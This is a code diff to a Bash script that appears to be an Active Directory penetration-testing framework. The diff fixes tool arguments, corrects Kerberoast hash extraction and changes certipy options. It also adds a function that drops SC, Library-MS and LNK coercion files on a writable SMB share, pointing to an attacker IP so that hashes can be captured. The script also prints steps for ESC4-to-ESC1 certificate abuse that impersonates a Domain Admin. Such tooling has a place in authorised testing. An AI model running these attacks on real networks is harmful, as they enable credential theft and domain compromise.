@@ -861,7 +861,7 @@ authenticate() {
             argument_silenthd="-u ${domain}\\\\'${user}' --hashes ${hash}"
             argument_windap="-d ${domain} -u '${user}' --hash ${hash}"
             argument_targkerb="-d ${domain} -u '${user}' -H ${hash}"
-            argument_p0dalirius="-d ${domain} -u '${user}' -H ${hash:33})"
+            argument_p0dalirius="-d ${domain} -u '${user}' -H ${hash:33}"
             argument_p0dalirius_a="-ad ${domain} -au '${user}' -ah ${hash}"
             argument_manspider="-d ${domain} -u '${user}' -H ${hash:33}"
             argument_coercer="-d ${domain} -u '${user}' --hashes ${hash}"
@@ -2196,7 +2196,7 @@ certipy_enum() {
             if [ "${ldapsign_bool}" == true ]; then ldapsign_param=""; else ldapsign_param="-no-ldap-signing"; fi
             if [ "${ldapbind_bool}" == true ]; then ldapbind_param=""; else ldapbind_param="-no-ldap-channel-binding"; fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-            run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapsign_param} ${ldapbind_param} -old-bloodhound -stdout"  | tee "${ADCS_dir}/certipy_output_${user_var}.txt"
+            run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapsign_param} ${ldapbind_param} -stdout"  | tee "${ADCS_dir}/certipy_output_${user_var}.txt"
             run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapsign_param} ${ldapbind_param} -vulnerable -json -output vuln_${dc_domain} -stdout -hide-admins" 2>&1 | tee -a "${ADCS_dir}/certipy_vulnerable_output_${user_var}.txt"
             cd "${current_dir}" || exit
         fi
@@ -2242,7 +2242,7 @@ adcs_vuln_parse() {
         for vulntemp in $esc4_vuln; do
             echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Make the template vulnerable to ESC1:${NC}"
-            echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -save-old -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -write-default-configuration -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Request certificate with an arbitrary UPN (Domain Admin or DC or both):${NC}"
             echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas_display}\" ] -target [ ${pki_servers_display} ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -dns ${dns_ip} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}3. Restore configuration of vulnerable template:${NC}"
@@ -2968,13 +2968,12 @@ kerberoast_attack() {
     else
         if [[ "${dc_domain,,}" != "${domain,,}" ]] || [ "${nullsess_bool}" == true ]; then
             echo -e "${BLUE}[*] Blind Kerberoasting Attack${NC}"
-            asrep_user=$(cut -d "@" -f 1 "${Kerberos_dir}/asreproast_hashes_${dc_domain}.txt" | head -n 1)
+            asrep_user=$(cut -d "@" -f 1 "${Kerberos_dir}/asreproast_hashes_${dc_domain}.txt" | cut -d '$' -f 4 | head -n 1)
             if [ ! "${asrep_user}" == "" ]; then
-                run_command "${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${users_list} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} ${dc_domain}" >"${Kerberos_dir}/kerberoast_blind_output_${dc_domain}.txt"
+                run_command "${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${users_list} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} -outputfile ${Kerberos_dir}/kerberoast_hashes_${dc_domain}.txt ${dc_domain}/" >> "${Kerberos_dir}/kerberoast_blind_output_${dc_domain}.txt"
                 if grep -q 'error' "${Kerberos_dir}/kerberoast_blind_output_${dc_domain}.txt"; then
                     echo -e "${RED}[-] Errors during Blind Kerberoast Attack... ${NC}"
                 elif [ "${noexec_bool}" == "false" ]; then
-                    grep "krb5tgs" "${Kerberos_dir}/kerberoast_blind_output_${dc_domain}.txt" | tee "${Kerberos_dir}/kerberoast_hashes_${dc_domain}.txt"
                     hash_count=$(wc -l < "${Kerberos_dir}/kerberoast_hashes_${dc_domain}.txt")
                     if [[ ! "${hash_count}" == 0 ]]; then
                         echo -e "${GREEN}[+] ${hash_count} hashes extracted! Saved to:${NC} ${Kerberos_dir}/kerberoast_hashes_${dc_domain}.txt"
@@ -3640,6 +3639,28 @@ relayking_check() {
             run_command "${relayking} ${argument_rking} --audit --protocols smb,ldap,ldaps,mssql,http,https -t ${curr_targets_list} --dc-ip ${dc_ip} ${ldaps_param} ${dnstcp_param} -ns ${dns_ip} --threads 10 -o plaintext,csv,json --output-file ${Vulnerabilities_dir}/relayking/relayking_audit_${dc_domain} --proto-portscan --gen-relay-list ${Vulnerabilities_dir}/relayking/relaytargets_output_${dc_domain}.txt" | tee -a "${Vulnerabilities_dir}/relayking/relayking_audit_output_${dc_domain}.txt"
         fi
     fi
+    echo -e ""
+}
+
+netexec_drop(){
+    echo -e "${BLUE}[*] Dropping LNK, Library-MC and SC on writeable share... ${NC}"
+    set_attackerIP
+    echo -e "${BLUE}[*] Please specify target IP or hostname:${NC}"
+    echo -e "${CYAN}[*] Example: 10.1.0.5 or DC01 or DC01.domain.com ${NC}"
+    read -rp ">> " drop_target </dev/tty
+    while [ "${drop_target}" == "" ]; do
+        echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
+        read -rp ">> " drop_target </dev/tty
+    done
+    echo -e "${BLUE}[*] Please specify writable share:${NC}"
+    read -rp ">> " drop_share </dev/tty
+    while [ "${drop_share}" == "" ]; do
+        echo -e "${RED}Invalid share.${NC} Please specify share to mount:"
+        read -rp ">> " drop_share </dev/tty
+    done
+    run_command "${netexec} ${ne_verbose} smb ${drop_target} ${argument_ne} -M drop-sc -o server=${attacker_IP} NAME=${drop_share} --log ${Vulnerabilities_dir}/ne_drop_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} smb ${drop_target} ${argument_ne} -M drop-library-ms -o server=${attacker_IP} NAME=${drop_share} --log ${Vulnerabilities_dir}/ne_drop_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} smb ${drop_target} ${argument_ne} -M slinky -o server=${attacker_IP} NAME=${drop_share} --log ${Vulnerabilities_dir}/ne_drop_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
@@ -6731,6 +6752,7 @@ vulns_menu() {
     check_tool_status "${FindUnusualSessions}" "Check for unusual sessions" "15"
     check_tool_status "${impacket_badsuccessor}" "Check for BadSuccessor vuln using netexec and impacket" "16"
     check_tool_status "${relayking}" "RelayKing Coerce scan" "17"
+    check_tool_status "${netexec}" "Drop LNK, Library-MS and SC (on writeable share)" "18"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -6829,6 +6851,11 @@ vulns_menu() {
 
     17)
         relayking_check
+        vulns_menu
+        ;;
+
+    18)
+        netexec_drop
         vulns_menu
         ;;
 
@@ -7115,7 +7142,7 @@ modif_menu() {
     check_tool_status "${bloodyad}" "Enable account (Requires: GenericWrite)" "7"
     check_tool_status "${bloodyad}" "Disable account (Requires: GenericWrite)" "8"
     check_tool_status "${bloodyad}" "Change Owner of target (Requires: WriteOwner permission)" "9"
-    check_tool_status "${bloodyad}" "Add GenericAll rights on target (Requires: Owner of object)" "10"
+    check_tool_status "${bloodyad}" "Add GenericAll rights on target (Requires: GenericWrite or WriteDACL)" "10"
     check_tool_status "${bloodyad}" "Delete user or computer (Requires: GenericWrite)" "11"
     check_tool_status "${bloodyad}" "Restore deleted user or computer (Requires: GenericWrite on OU of deleted object)" "12"
     check_tool_status "${targetedKerberoast}" "Targeted Kerberoast Attack (Noisy!) (Requires: WriteSPN)" "13"
